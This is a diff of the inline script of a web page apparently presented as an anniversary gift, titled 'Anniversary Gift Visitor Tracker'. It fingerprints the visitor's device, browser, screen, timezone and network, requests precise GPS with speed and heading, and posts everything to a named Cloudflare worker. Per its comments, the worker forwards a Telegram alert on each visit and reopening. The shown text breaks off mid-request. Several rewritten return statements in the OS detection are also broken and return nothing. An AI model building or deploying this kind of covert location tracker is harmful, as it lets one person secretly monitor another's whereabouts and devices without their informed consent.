@@ -1095,1427 +1095,2141 @@
 <script defer src="script.js?v=319"></script>
 <!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "0dc6f2a7eff24098b817ddbd7fc766ba"}'></script><!-- End Cloudflare Web Analytics -->
 <script>
-/* =========================================================
-   ANNIVERSARY GIFT VISITOR TRACKER
-   =========================================================
+(() => {
 
-   FEATURES
-
-   • Initial visit alert
-   • Reopening alert
-   • Precise GPS
-   • GPS accuracy
-   • Altitude
-   • Altitude accuracy
-   • Heading
-   • Speed
-   • Browser detection
-   • Brave detection
-   • Browser version
-   • Rendering engine
-   • iPhone detection
-   • iPad detection
-   • iPadOS-as-Mac detection
-   • iOS 26 Safari handling
-   • Touchscreen detection
-   • Maximum touch points
-   • Screen size
-   • Viewport size
-   • Orientation
-   • Language
-   • Timezone
-   • Network location
-   • ASN
-   • Referrer
-   • Current page
-   • One Telegram message per event
-   • Reopening contains GPS
-   • GPS cannot prevent basic alert
-   ========================================================= */
+  // ============================================================
+  // ANNIVERSARY GIFT VISITOR TRACKER
+  // GITHUB PAGES CLIENT SCRIPT
+  //
+  // This script:
+  //
+  // 1. Detects the device
+  // 2. Detects the operating system
+  // 3. Detects the browser
+  // 4. Attempts Brave-specific detection
+  // 5. Detects touchscreen capability
+  // 6. Detects maximum touch points
+  // 7. Reads display information
+  // 8. Reads language and timezone
+  // 9. Checks geolocation permission state
+  // 10. Requests precise GPS when allowed/prompted
+  // 11. Sends GPS + browser information to Cloudflare
+  // 12. Handles reopening
+  // 13. Handles previously-denied location permission
+  //
+  // IMPORTANT:
+  // The browser controls geolocation permission.
+  // This script does NOT bypass or override a denial.
+  // ============================================================
 
 
-/* =========================================================
-   CONFIGURATION
-========================================================= */
+  // ============================================================
+  // CONFIGURATION
+  // ============================================================
 
-const VISITOR_WORKER =
+  const VISITOR_WORKER =
     "https://flat-bush-3ad6.nassaranwar.workers.dev/";
 
 
-/*
- * Maximum time we allow the GPS operation to wait.
- *
- * The Telegram alert MUST NOT depend forever on GPS.
- */
-
-const GPS_TIMEOUT =
-    10000;
+  // Maximum time we'll wait for GPS.
+  const GPS_TIMEOUT =
+    15000;
 
 
-/*
- * Prevent duplicate reopening events caused by
- * multiple browser lifecycle events.
- */
-
-const RETURN_ALERT_COOLDOWN =
-    5000;
-
-
-/*
- * Prevent sending multiple initial alerts if a browser
- * fires unusual page lifecycle events.
- */
-
-const INITIAL_ALERT_COOLDOWN =
+  // Prevent accidental duplicate alerts.
+  const INITIAL_ALERT_COOLDOWN =
     3000;
 
 
-/* =========================================================
-   STATE
-========================================================= */
-
-let lastReturnAlert =
-    0;
-
-let lastInitialAlert =
-    0;
+  const RETURN_ALERT_COOLDOWN =
+    5000;
 
 
-/* =========================================================
-   DEVICE DETECTION
-========================================================= */
+  // ============================================================
+  // INTERNAL STATE
+  // ============================================================
 
-function detectDevice() {
+  let lastAlertTime = 0;
+
+  let initialVisitHandled = false;
+
+
+  // ============================================================
+  // SAFE STRING HELPER
+  // ============================================================
+
+  function safe(
+    value,
+    fallback = "Unknown"
+  ) {
+
+    if (
+      value === undefined ||
+      value === null ||
+      value === ""
+    ) {
+      return fallback;
+    }
+
+    return String(value);
+  }
+
+
+  // ============================================================
+  // DEVICE DETECTION
+  // ============================================================
+
+  function detectDevice() {
 
     const ua =
-        navigator.userAgent;
+      navigator.userAgent || "";
 
 
-    /*
-     * Normal iPad UA
-     */
+    const touchPoints =
+      navigator.maxTouchPoints || 0;
+
+
+    // ----------------------------------------------------------
+    // iPad
+    //
+    // iPadOS can identify itself as Macintosh.
+    // Touch points allow us to distinguish it from a Mac.
+    // ----------------------------------------------------------
 
     if (
-        /iPad/i.test(ua)
+      /iPad/i.test(ua) ||
+      (
+        /Macintosh/i.test(ua) &&
+        touchPoints > 1
+      )
     ) {
 
-        return "iPad";
+      return "iPad";
     }
 
 
-    /*
-     * iPadOS can identify itself as Macintosh.
-     *
-     * maxTouchPoints distinguishes it from a normal Mac.
-     */
+    // ----------------------------------------------------------
+    // iPhone
+    // ----------------------------------------------------------
 
-    if (
-        navigator.platform ===
-            "MacIntel" &&
-        navigator.maxTouchPoints > 1
-    ) {
+    if (/iPhone/i.test(ua)) {
 
-        return "iPad";
+      return "iPhone";
     }
 
 
-    /*
-     * iPhone
-     */
+    // ----------------------------------------------------------
+    // iPod
+    // ----------------------------------------------------------
 
-    if (
-        /iPhone/i.test(ua)
-    ) {
+    if (/iPod/i.test(ua)) {
 
-        return "iPhone";
+      return "iPod";
     }
 
 
-    /*
-     * iPod
-     */
+    // ----------------------------------------------------------
+    // Android
+    // ----------------------------------------------------------
 
-    if (
-        /iPod/i.test(ua)
-    ) {
+    if (/Android/i.test(ua)) {
 
-        return "iPod";
+      return "Android";
     }
 
 
-    /*
-     * Android
-     */
+    // ----------------------------------------------------------
+    // Windows Phone
+    // ----------------------------------------------------------
 
-    if (
-        /Android/i.test(ua)
-    ) {
+    if (/Windows Phone/i.test(ua)) {
 
-        return "Android";
+      return "Windows Phone";
     }
 
 
-    /*
-     * Windows
-     */
+    // ----------------------------------------------------------
+    // Windows PC
+    // ----------------------------------------------------------
 
-    if (
-        /Windows/i.test(ua)
-    ) {
+    if (/Windows/i.test(ua)) {
 
-        return "Windows PC";
+      return "Windows PC";
     }
 
 
-    /*
-     * Mac
-     */
+    // ----------------------------------------------------------
+    // Mac
+    // ----------------------------------------------------------
 
-    if (
-        /Macintosh/i.test(ua)
-    ) {
+    if (/Macintosh/i.test(ua)) {
 
-        return "Mac";
+      return "Mac";
+    }
+
+
+    // ----------------------------------------------------------
+    // Linux
+    // ----------------------------------------------------------
+
+    if (/Linux/i.test(ua)) {
+
+      return "Linux";
     }
 
 
     return "Unknown";
-}
+  }
 
 
-/* =========================================================
-   TOUCHSCREEN DETECTION
-========================================================= */
+  // ============================================================
+  // TOUCHSCREEN DETECTION
+  // ============================================================
 
-function detectTouchscreen() {
+  function detectTouchscreen() {
 
     const ua =
-        navigator.userAgent;
+      navigator.userAgent || "";
 
 
-    /*
-     * Explicitly identify known mobile
-     * touchscreen devices.
-     */
+    const touchPoints =
+      navigator.maxTouchPoints || 0;
+
+
+    // iPhone / iPad / Android are touch devices.
 
     if (
-        /iPhone|iPad|iPod|Android/i.test(
-            ua
-        )
+      /iPhone|iPad|iPod|Android/i.test(ua)
     ) {
 
-        return true;
+      return true;
     }
 
 
-    /*
-     * iPadOS masquerading as Macintosh.
-     */
+    // Other devices may expose touch points.
 
     if (
-        navigator.platform ===
-            "MacIntel" &&
-        navigator.maxTouchPoints > 0
+      touchPoints > 0
     ) {
 
-        return true;
-    }
-
-
-    /*
-     * Generic browser signals.
-     */
-
-    if (
-        navigator.maxTouchPoints > 0
-    ) {
-
-        return true;
-    }
-
-
-    if (
-        "ontouchstart" in window
-    ) {
-
-        return true;
+      return true;
     }
 
 
     return false;
-}
+  }
 
 
-/* =========================================================
-   BROWSER VERSION HELPER
-========================================================= */
+  // ============================================================
+  // BROWSER VERSION EXTRACTION
+  // ============================================================
 
-function getVersion(regex) {
+  function extractVersion(
+    ua,
+    regex
+  ) {
 
     const match =
-        navigator.userAgent.match(
-            regex
-        );
+      ua.match(regex);
 
 
     return match
-        ? match[1]
-        : "";
-}
+      ? match[1]
+      : "Unknown";
+  }
 
 
-/* =========================================================
-   BROWSER DETECTION
-========================================================= */
+  // ============================================================
+  // BROWSER DETECTION
+  // ============================================================
 
-async function detectBrowser() {
+  async function detectBrowser() {
 
     const ua =
-        navigator.userAgent;
+      navigator.userAgent || "";
 
 
-    /* =====================================================
-       BRAVE
-    ===================================================== */
+    const vendor =
+      navigator.vendor || "";
+
+
+    // ----------------------------------------------------------
+    // BRAVE
+    //
+    // This is the strongest browser-side Brave signal when
+    // navigator.brave.isBrave() is exposed.
+    // ----------------------------------------------------------
 
     try {
 
-        if (
-            navigator.brave &&
-            typeof
-                navigator.brave.isBrave ===
-                    "function"
-        ) {
+      if (
+        navigator.brave &&
+        typeof navigator.brave.isBrave ===
+          "function"
+      ) {
 
-            const brave =
-                await
-                    navigator.brave.isBrave();
+        const isBrave =
+          await navigator.brave.isBrave();
 
 
-            if (brave) {
+        if (isBrave) {
 
-                return {
+          return {
 
-                    name:
-                        "Brave",
+            name:
+              "Brave",
 
-                    version:
-                        getVersion(
-                            /Brave\/([0-9.]+)/i
-                        ) ||
-                        getVersion(
-                            /Chrome\/([0-9.]+)/i
-                        ),
+            version:
+              extractVersion(
+                ua,
+                /(?:Brave|Chrome|CriOS)\/([\d.]+)/i
+              ),
 
-                    detection:
-                        "Brave API",
-
-                    engine:
-                        detectEngine()
-                };
-            }
+            detection:
+              "navigator.brave.isBrave() = true"
+          };
         }
+      }
 
     } catch (error) {
 
-        console.log(
-            "Brave detection unavailable:",
-            error
-        );
+      // Continue with fallback detection.
     }
 
 
-    /* =====================================================
-       INSTAGRAM
-    ===================================================== */
+    // ----------------------------------------------------------
+    // INSTAGRAM
+    // ----------------------------------------------------------
 
-    if (
-        /Instagram/i.test(ua)
-    ) {
+    if (/Instagram/i.test(ua)) {
 
-        return {
-
-            name:
-                "Instagram",
-
-            version:
-                getVersion(
-                    /Instagram[\s\/]([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       FACEBOOK
-    ===================================================== */
-
-    if (
-        /FBAN|FBAV/i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Facebook",
-
-            version:
-                getVersion(
-                    /FBAV\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       TIKTOK
-    ===================================================== */
-
-    if (
-        /TikTok/i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "TikTok",
-
-            version:
-                getVersion(
-                    /TikTok[\s\/]+([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       GOOGLE APP
-    ===================================================== */
-
-    if (
-        /GSA\//i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Google App",
-
-            version:
-                getVersion(
-                    /GSA\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       SAMSUNG INTERNET
-    ===================================================== */
-
-    if (
-        /SamsungBrowser/i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Samsung Internet",
-
-            version:
-                getVersion(
-                    /SamsungBrowser\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       DUCKDUCKGO
-    ===================================================== */
-
-    if (
-        /DuckDuckGo/i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "DuckDuckGo",
-
-            version:
-                getVersion(
-                    /DuckDuckGo\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       YANDEX
-    ===================================================== */
-
-    if (
-        /YaBrowser/i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Yandex",
-
-            version:
-                getVersion(
-                    /YaBrowser\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       OPERA
-    ===================================================== */
-
-    if (
-        /OPR\//i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Opera",
-
-            version:
-                getVersion(
-                    /OPR\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       EDGE
-    ===================================================== */
-
-    if (
-        /Edg\//i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Microsoft Edge",
-
-            version:
-                getVersion(
-                    /Edg\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       FIREFOX
-    ===================================================== */
-
-    if (
-        /Firefox\//i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Firefox",
-
-            version:
-                getVersion(
-                    /Firefox\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       CHROME
-    ===================================================== */
-
-    if (
-        /Chrome\//i.test(ua) &&
-        !/Edg\//i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Chrome",
-
-            version:
-                getVersion(
-                    /Chrome\/([0-9.]+)/i
-                ),
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    /* =====================================================
-       SAFARI — LAST
-    ===================================================== */
-
-    if (
-        /Safari\//i.test(ua)
-    ) {
-
-        return {
-
-            name:
-                "Safari",
-
-            version:
-                getVersion(
-                    /Version\/([0-9.]+)/i
-                ) ||
-                "Unknown",
-
-            detection:
-                "User-Agent",
-
-            engine:
-                detectEngine()
-        };
-    }
-
-
-    return {
+      return {
 
         name:
-            "Unknown",
+          "Instagram In-App Browser",
 
         version:
-            "",
+          extractVersion(
+            ua,
+            /Instagram[^ ]*\/([\d.]+)/i
+          ),
 
         detection:
-            "No reliable browser signal",
-
-        engine:
-            detectEngine()
-    };
-}
-
-
-/* =========================================================
-   ENGINE
-========================================================= */
-
-function detectEngine() {
-
-    const ua =
-        navigator.userAgent;
-
-
-    if (
-        /AppleWebKit/i.test(ua)
-    ) {
-
-        return "WebKit";
+          "User-Agent"
+      };
     }
 
 
+    // ----------------------------------------------------------
+    // FACEBOOK
+    // ----------------------------------------------------------
+
     if (
-        /Gecko/i.test(ua)
+      /FBAN|FBAV/i.test(ua)
     ) {
 
-        return "Gecko";
+      return {
+
+        name:
+          "Facebook In-App Browser",
+
+        version:
+          extractVersion(
+            ua,
+            /FBAV\/([\d.]+)/i
+          ),
+
+        detection:
+          "User-Agent"
+      };
     }
 
 
-    if (
-        /Trident/i.test(ua)
-    ) {
+    // ----------------------------------------------------------
+    // TIKTOK
+    // ----------------------------------------------------------
 
-        return "Trident";
+    if (/TikTok/i.test(ua)) {
+
+      return {
+
+        name:
+          "TikTok In-App Browser",
+
+        version:
+          extractVersion(
+            ua,
+            /TikTok[^ ]*\/([\d.]+)/i
+          ),
+
+        detection:
+          "User-Agent"
+      };
     }
 
 
-    return "Unknown";
-}
+    // ----------------------------------------------------------
+    // SAMSUNG INTERNET
+    // ----------------------------------------------------------
 
+    if (/SamsungBrowser/i.test(ua)) {
 
-/* =========================================================
-   OPERATING SYSTEM
-========================================================= */
+      return {
 
-function detectOS() {
+        name:
+          "Samsung Internet",
 
-    const ua =
-        navigator.userAgent;
+        version:
+          extractVersion(
+            ua,
+            /SamsungBrowser\/([\d.]+)/i
+          ),
 
-
-    /* =====================================================
-       iOS / iPadOS
-    ===================================================== */
-
-    if (
-        /iPhone|iPad|iPod/i.test(ua)
-    ) {
-
-        const match =
-            ua.match(
-                /OS (\d+)[._](\d+)(?:[._](\d+))?/i
-            );
-
-
-        if (match) {
-
-            const major =
-                Number(match[1]);
-
-            const minor =
-                Number(match[2]);
-
-
-            /*
-             * iOS/iPadOS 26 Safari uses a frozen
-             * OS UA value instead of exposing 26.
-             */
-
-            if (
-                major === 18 &&
-                (
-                    minor === 6 ||
-                    minor === 7
-                )
-            ) {
-
-                return (
-                    "iOS/iPadOS 26+ " +
-                    "(exact OS version hidden by WebKit)"
-                );
-            }
-
-
-            return (
-                `iOS/iPadOS ${match[1]}.${match[2]}` +
-                (
-                    match[3]
-                        ? "." +
-                          match[3]
-                        : ""
-                )
-            );
-        }
-
-
-        return "iOS/iPadOS";
+        detection:
+          "User-Agent"
+      };
     }
 
 
-    /* =====================================================
-       ANDROID
-    ===================================================== */
+    // ----------------------------------------------------------
+    // DUCKDUCKGO
+    // ----------------------------------------------------------
 
-    if (
-        /Android/i.test(ua)
-    ) {
+    if (/DuckDuckGo/i.test(ua)) {
 
-        const match =
-            ua.match(
-                /Android ([0-9.]+)/i
-            );
+      return {
 
+        name:
+          "DuckDuckGo",
 
-        return match
-            ? `Android ${match[1]}`
-            : "Android";
+        version:
+          extractVersion(
+            ua,
+            /DuckDuckGo\/([\d.]+)/i
+          ),
+
+        detection:
+          "User-Agent"
+      };
     }
 
 
-    /* =====================================================
-       WINDOWS
-    ===================================================== */
+    // ----------------------------------------------------------
+    // YANDEX
+    // ----------------------------------------------------------
 
-    if (
-        /Windows/i.test(ua)
-    ) {
+    if (/YaBrowser/i.test(ua)) {
 
-        return "Windows";
+      return {
+
+        name:
+          "Yandex",
+
+        version:
+          extractVersion(
+            ua,
+            /YaBrowser\/([\d.]+)/i
+          ),
+
+        detection:
+          "User-Agent"
+      };
     }
 
 
-    /* =====================================================
-       MACOS
-    ===================================================== */
+    // ----------------------------------------------------------
+    // OPERA
+    // ----------------------------------------------------------
 
     if (
-        /Mac OS X/i.test(ua)
+      /OPR\/|Opera/i.test(ua)
     ) {
 
-        return "macOS";
+      return {
+
+        name:
+          "Opera",
+
+        version:
+          extractVersion(
+            ua,
+            /(?:OPR|Opera)\/([\d.]+)/i
+          ),
+
+        detection:
+          "User-Agent"
+      };
     }
 
 
-    /* =====================================================
-       LINUX
-    ===================================================== */
+    // ----------------------------------------------------------
+    // EDGE
+    // ----------------------------------------------------------
 
-    if (
-        /Linux/i.test(ua)
-    ) {
+    if (/Edg\//i.test(ua)) {
 
-        return "Linux";
+      return {
+
+        name:
+          "Microsoft Edge",
+
+        version:
+          extractVersion(
+            ua,
+            /Edg\/([\d.]+)/i
+          ),
+
+        detection:
+          "User-Agent"
+      };
     }
 
 
-    return "Unknown";
-}
+    // ----------------------------------------------------------
+    // FIREFOX
+    // ----------------------------------------------------------
+
+    if (/Firefox\//i.test(ua)) {
+
+      return {
+
+        name:
+          "Firefox",
+
+        version:
+          extractVersion(
+            ua,
+            /Firefox\/([\d.]+)/i
+          ),
+
+        detection:
+          "User-Agent"
+      };
+    }
 
 
-/* =========================================================
-   GPS
-========================================================= */
+    // ----------------------------------------------------------
+    // CHROME ON iOS
+    // ----------------------------------------------------------
 
-function getPreciseLocation() {
+    if (/CriOS\//i.test(ua)) {
 
-    return new Promise(
-        resolve => {
+      return {
 
-            /*
-             * Geolocation unavailable.
-             */
+        name:
+          "Chrome",
 
-            if (
-                !navigator.geolocation
-            ) {
+        version:
+          extractVersion(
+            ua,
+            /CriOS\/([\d.]+)/i
+          ),
 
-                resolve(null);
-
-                return;
-            }
-
-
-            let completed =
-                false;
+        detection:
+          "User-Agent"
+      };
+    }
 
 
-            function finish(
-                result
-            ) {
+    // ----------------------------------------------------------
+    // CHROME
+    // ----------------------------------------------------------
 
-                if (
-                    completed
-                ) {
+    if (/Chrome\//i.test(ua)) {
 
-                    return;
-                }
+      return {
 
+        name:
+          "Chrome",
 
-                completed =
-                    true;
+        version:
+          extractVersion(
+            ua,
+            /Chrome\/([\d.]+)/i
+          ),
 
-
-                resolve(
-                    result
-                );
-            }
-
-
-            /*
-             * Independent safety timeout.
-             *
-             * Even if the browser itself gets stuck,
-             * our tracker continues.
-             */
-
-            const safetyTimer =
-                setTimeout(
-                    () => {
-
-                        console.log(
-                            "GPS safety timeout."
-                        );
-
-                        finish(null);
-
-                    },
-                    GPS_TIMEOUT + 1000
-                );
+        detection:
+          "User-Agent"
+      };
+    }
 
 
-            navigator.geolocation
-                .getCurrentPosition(
+    // ----------------------------------------------------------
+    // SAFARI
+    // ----------------------------------------------------------
 
-                    position => {
+    if (
+      /Safari\//i.test(ua) &&
+      /Apple Computer/i.test(vendor)
+    ) {
 
-                        clearTimeout(
-                            safetyTimer
-                        );
+      return {
 
+        name:
+          "Safari",
 
-                        const coords =
-                            position.coords;
+        version:
+          extractVersion(
+            ua,
+            /Version\/([\d.]+)/i
+          ),
 
-
-                        finish({
-
-                            latitude:
-                                coords.latitude,
-
-                            longitude:
-                                coords.longitude,
-
-                            accuracy:
-                                coords.accuracy,
-
-                            altitude:
-                                coords.altitude,
-
-                            altitudeAccuracy:
-                                coords.altitudeAccuracy,
-
-                            heading:
-                                coords.heading,
-
-                            speed:
-                                coords.speed
-                        });
-
-                    },
+        detection:
+          "User-Agent"
+      };
+    }
 
 
-                    error => {
-
-                        clearTimeout(
-                            safetyTimer
-                        );
-
-
-                        console.log(
-                            "GPS error:",
-                            error.code,
-                            error.message
-                        );
-
-
-                        finish(null);
-                    },
-
-
-                    {
-
-                        enableHighAccuracy:
-                            true,
-
-                        maximumAge:
-                            0,
-
-                        timeout:
-                            GPS_TIMEOUT
-                    }
-                );
-        }
-    );
-}
-
-
-/* =========================================================
-   NETWORK INFORMATION
-========================================================= */
-
-function getNetworkInformation() {
-
-    /*
-     * These values are populated by the Worker from
-     * Cloudflare request information.
-     *
-     * We leave these fields here so the payload structure
-     * stays explicit and extensible.
-     */
+    // ----------------------------------------------------------
+    // UNKNOWN
+    // ----------------------------------------------------------
 
     return {
 
-        country:
-            "",
+      name:
+        "Unknown",
 
-        region:
-            "",
+      version:
+        "Unknown",
 
-        city:
-            "",
-
-        networkTimezone:
-            "",
-
-        asn:
-            ""
+      detection:
+        "No reliable browser signature"
     };
-}
+  }
 
 
-/* =========================================================
-   COMMON BROWSER DATA
-========================================================= */
+  // ============================================================
+  // OPERATING SYSTEM
+  // ============================================================
 
-async function getCommonData() {
+  function detectOperatingSystem() {
 
-    const browser =
-        await detectBrowser();
-
-
-    const network =
-        getNetworkInformation();
+    const ua =
+      navigator.userAgent || "";
 
 
-    return {
-
-        /* Browser */
-
-        browser:
-            browser.name,
-
-        browserVersion:
-            browser.version,
-
-        browserDetection:
-            browser.detection,
-
-        engine:
-            browser.engine,
+    const touchPoints =
+      navigator.maxTouchPoints || 0;
 
 
-        /* Operating system */
+    // ----------------------------------------------------------
+    // iOS / iPadOS
+    // ----------------------------------------------------------
 
-        os:
-            detectOS(),
+    if (
+      /iPhone|iPad|iPod/i.test(ua) ||
+      (
+        /Macintosh/i.test(ua) &&
+        touchPoints > 1
+      )
+    ) {
 
-
-        /* Device */
-
-        device:
-            detectDevice(),
-
-
-        /* Touch */
-
-        touchScreen:
-            detectTouchscreen(),
-
-        maxTouchPoints:
-            navigator.maxTouchPoints ||
-            0,
+      const iosMatch =
+        ua.match(
+          /OS (\d+)[._](\d+)(?:[._](\d+))?/i
+        );
 
 
-        /* Screen */
+      if (iosMatch) {
 
-        screenWidth:
-            window.screen.width,
-
-        screenHeight:
-            window.screen.height,
-
-
-        /* Viewport */
-
-        viewportWidth:
-            window.innerWidth,
-
-        viewportHeight:
-            window.innerHeight,
+        const major =
+          parseInt(
+            iosMatch[1],
+            10
+          );
 
 
-        /* Orientation */
-
-        orientation:
-            screen.orientation?.type ||
-            (
-                window.innerWidth >
-                window.innerHeight
-                    ? "landscape"
-                    : "portrait"
-            ),
+        const minor =
+          parseInt(
+            iosMatch[2] || "0",
+            10
+          );
 
 
-        /* Language */
+        const patch =
+          parseInt(
+            iosMatch[3] || "0",
+            10
+          );
 
-        language:
-            navigator.language ||
-            "Unknown",
-
-
-        /* Timezone */
-
-        timezone:
-            Intl.DateTimeFormat()
-                .resolvedOptions()
-                .timeZone ||
-            "Unknown",
-
-
-        /* Page */
-
-        page:
-            location.href,
-
-
-        /* Referrer */
-
-        referrer:
-            document.referrer ||
-            "",
-
-
-        /* Network placeholders */
-
-        ...network
-    };
-}
-
-
-/* =========================================================
-   SEND COMBINED ALERT
-========================================================= */
-
-async function sendCombinedAlert(
-    type
-) {
-
-    try {
 
         /*
-         * IMPORTANT:
+         * Modern WebKit can expose a frozen/older
+         * OS version in its User-Agent.
          *
-         * GPS and browser information are gathered
-         * independently.
-         *
-         * GPS failure does NOT cancel the alert.
+         * Therefore we don't pretend that 18.6/18.7
+         * means the device is actually running iOS 18.
          */
 
-        const gpsPromise =
-            getPreciseLocation();
+        if (
+          major === 18 &&
+          minor >= 6
+        ) {
+
+          return
+            "iOS/iPadOS 26+ " +
+            "(exact OS version hidden by WebKit)";
+        }
 
 
-        const commonPromise =
-            getCommonData();
+        return
+          `iOS/iPadOS ${major}.${minor}.${patch}`;
+      }
 
 
-        const [
-            gps,
-            common
-        ] =
-            await Promise.all([
-                gpsPromise,
-                commonPromise
-            ]);
+      return
+        "iOS/iPadOS";
+    }
 
 
-        /* =================================================
-           BUILD PAYLOAD
-        ================================================= */
+    // ----------------------------------------------------------
+    // ANDROID
+    // ----------------------------------------------------------
 
-        const payload = {
+    const androidMatch =
+      ua.match(
+        /Android ([\d.]+)/i
+      );
 
-            type,
 
-            ...common
+    if (androidMatch) {
+
+      return
+        `Android ${androidMatch[1]}`;
+    }
+
+
+    // ----------------------------------------------------------
+    // WINDOWS
+    // ----------------------------------------------------------
+
+    if (
+      /Windows NT 10\.0/i.test(ua)
+    ) {
+
+      return
+        "Windows 10/11";
+    }
+
+
+    if (
+      /Windows NT 6\.3/i.test(ua)
+    ) {
+
+      return
+        "Windows 8.1";
+    }
+
+
+    if (
+      /Windows NT 6\.1/i.test(ua)
+    ) {
+
+      return
+        "Windows 7";
+    }
+
+
+    // ----------------------------------------------------------
+    // MACOS
+    // ----------------------------------------------------------
+
+    const macMatch =
+      ua.match(
+        /Mac OS X ([\d_]+)/i
+      );
+
+
+    if (macMatch) {
+
+      return
+        `macOS ${macMatch[1]
+          .replace(/_/g, ".")}`;
+    }
+
+
+    // ----------------------------------------------------------
+    // LINUX
+    // ----------------------------------------------------------
+
+    if (/Linux/i.test(ua)) {
+
+      return "Linux";
+    }
+
+
+    return "Unknown";
+  }
+
+
+  // ============================================================
+  // BROWSER ENGINE
+  // ============================================================
+
+  function detectEngine() {
+
+    const ua =
+      navigator.userAgent || "";
+
+
+    if (/AppleWebKit/i.test(ua)) {
+
+      if (
+        /Chrome|CriOS|Chromium|Edg|OPR/i.test(
+          ua
+        )
+      ) {
+
+        return
+          "AppleWebKit-compatible UA / Blink browser";
+      }
+
+
+      return "WebKit";
+    }
+
+
+    if (/Gecko\//i.test(ua)) {
+
+      return "Gecko";
+    }
+
+
+    return "Unknown";
+  }
+
+
+  // ============================================================
+  // ORIENTATION
+  // ============================================================
+
+  function getOrientation() {
+
+    if (
+      screen.orientation &&
+      screen.orientation.type
+    ) {
+
+      return screen.orientation.type;
+    }
+
+
+    if (
+      window.innerWidth >
+      window.innerHeight
+    ) {
+
+      return "landscape";
+    }
+
+
+    return "portrait";
+  }
+
+
+  // ============================================================
+  // BROWSER CONNECTION INFORMATION
+  // ============================================================
+
+  function getConnectionInformation() {
+
+    /*
+     * navigator.connection is not supported by every browser.
+     *
+     * Therefore every value has a safe fallback.
+     */
+
+    const connection =
+      navigator.connection ||
+      navigator.mozConnection ||
+      navigator.webkitConnection;
+
+
+    if (!connection) {
+
+      return {
+
+        connectionType:
+          "Unavailable",
+
+        effectiveType:
+          "Unavailable",
+
+        downlink:
+          null,
+
+        rtt:
+          null,
+
+        saveData:
+          null
+      };
+    }
+
+
+    return {
+
+      connectionType:
+        connection.type ||
+        "Unknown",
+
+      effectiveType:
+        connection.effectiveType ||
+        "Unknown",
+
+      downlink:
+        typeof connection.downlink ===
+          "number"
+          ? connection.downlink
+          : null,
+
+      rtt:
+        typeof connection.rtt ===
+          "number"
+          ? connection.rtt
+          : null,
+
+      saveData:
+        typeof connection.saveData ===
+          "boolean"
+          ? connection.saveData
+          : null
+    };
+  }
+
+
+  // ============================================================
+  // PRECISE GPS
+  // ============================================================
+
+  function getPreciseLocation() {
+
+    return new Promise(
+      (resolve) => {
+
+        // ------------------------------------------------------
+        // GELOCATION API CHECK
+        // ------------------------------------------------------
+
+        if (
+          !(
+            "geolocation" in
+            navigator
+          )
+        ) {
+
+          resolve({
+
+            available:
+              false,
+
+            error:
+              "Geolocation API unavailable",
+
+            code:
+              null
+          });
+
+          return;
+        }
+
+
+        let finished =
+          false;
+
+
+        // ------------------------------------------------------
+        // FINISH ONLY ONCE
+        // ------------------------------------------------------
+
+        function finish(
+          result
+        ) {
+
+          if (finished) {
+            return;
+          }
+
+
+          finished = true;
+
+
+          resolve(result);
+        }
+
+
+        // ------------------------------------------------------
+        // HIGH ACCURACY GPS OPTIONS
+        // ------------------------------------------------------
+
+        const options = {
+
+          enableHighAccuracy:
+            true,
+
+          /*
+           * Do not intentionally accept an old cached position.
+           */
+
+          maximumAge:
+            0,
+
+          /*
+           * Wait up to 15 seconds for a position.
+           */
+
+          timeout:
+            GPS_TIMEOUT
         };
 
 
-        /* =================================================
-           GPS
-        ================================================= */
+        // ------------------------------------------------------
+        // REQUEST POSITION
+        // ------------------------------------------------------
 
-        if (
-            gps
-        ) {
+        navigator.geolocation.getCurrentPosition(
 
-            payload.latitude =
-                gps.latitude;
+          // ====================================================
+          // SUCCESS
+          // ====================================================
 
-            payload.longitude =
-                gps.longitude;
+          (position) => {
 
-            payload.accuracy =
-                gps.accuracy;
-
-            payload.altitude =
-                gps.altitude;
-
-            payload.altitudeAccuracy =
-                gps.altitudeAccuracy;
-
-            payload.heading =
-                gps.heading;
-
-            payload.speed =
-                gps.speed;
-        }
+            const coords =
+              position.coords;
 
 
-        /* =================================================
-           SEND TO WORKER
-        ================================================= */
+            finish({
 
-        const response =
-            await fetch(
-                VISITOR_WORKER,
-                {
+              available:
+                true,
 
-                    method:
-                        "POST",
+              latitude:
+                coords.latitude,
 
-                    headers: {
+              longitude:
+                coords.longitude,
 
-                        "Content-Type":
-                            "application/json"
-                    },
+              accuracy:
+                coords.accuracy,
 
-                    body:
-                        JSON.stringify(
-                            payload
-                        ),
